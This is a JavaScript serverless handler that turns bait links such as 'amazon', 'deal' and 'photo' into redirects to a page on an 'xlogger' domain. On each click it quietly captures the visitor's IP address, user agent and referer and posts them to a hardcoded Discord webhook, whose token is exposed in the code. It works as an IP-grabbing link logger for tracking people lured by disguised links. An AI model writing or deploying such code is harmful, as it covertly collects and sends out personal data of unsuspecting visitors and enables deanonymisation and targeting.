export default function handler(req, res) {
  const { slug } = req.query;
  
  // List of redirects - you can add more here
  const redirects = {
    '01xhwjif': 'https://xlogger-main.vercel.app/preview.html',
    'amazon': 'https://xlogger-main.vercel.app/preview.html',
    'product': 'https://xlogger-main.vercel.app/preview.html',
    'deal': 'https://xlogger-main.vercel.app/preview.html',
    'offer': 'https://xlogger-main.vercel.app/preview.html',
    'photo': 'https://xlogger-main.vercel.app/preview.html',
    'image': 'https://xlogger-main.vercel.app/preview.html',
    'special': 'https://xlogger-main.vercel.app/preview.html',
    'view': 'https://xlogger-main.vercel.app/preview.html',
    'check': 'https://xlogger-main.vercel.app/preview.html'
  };
  
  // Default redirect if no specific match
  const targetUrl = redirects[slug] || 'https://xlogger-main.vercel.app/preview.html';
  
  // Log the redirect for tracking
  console.log('Redirect:', {
    from: slug,
    to: targetUrl,
    ip: req.headers['x-forwarded-for'] || req.headers['x-real-ip'],
    userAgent: req.headers['user-agent'],
    referer: req.headers.referer,
    timestamp: new Date().toISOString()
  });
  
  // Send tracking data to Discord
  try {
    const payload = `**🔗 Redirect Accessed**\n` +
      `**From:** /${slug}\n` +
      `**To:** ${targetUrl}\n` +
      `**IP:** ${req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'Unknown'}\n` +
      `**User-Agent:** ${req.headers['user-agent'] || 'Unknown'}\n` +
      `**Referer:** ${req.headers.referer || 'Direct'}\n` +
      `**Time:** ${new Date().toISOString()}`;
    
    fetch('https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6XyXxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: payload })
    }).catch(() => {}); // Ignore Discord errors
    
  } catch (error) {
    console.log('Discord tracking failed:', error);
  }
  
  // Perform the redirect
  res.writeHead(302, {
    'Location': targetUrl,
    'Cache-Control': 'public, max-age=3600'
  });
  res.end();
}
